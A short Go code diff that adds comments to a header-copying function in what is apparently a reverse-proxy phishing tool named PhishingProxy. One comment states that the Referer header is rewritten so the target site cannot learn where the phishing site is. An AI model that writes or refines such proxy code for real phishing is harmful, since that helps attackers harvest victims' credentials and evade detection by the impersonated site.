@@ -105,9 +105,15 @@ func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error
 	for key := range request.Header {
 		req.Header.Set(key, request.Header.Get(key))
 	}
+
+	// Don't let a stray referer header give away the location of our site.
+	// Note that this will not prevent leakage from full URLs.
 	if request.Referer() != "" {
 		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
 	}
+
+	// Go supports gzip compression, but not Brotli.
+	// Since the underlying transport handles compression, remove this header to avoid problems.
 	req.Header.Del("Accept-Encoding")
 	return req, nil
 }
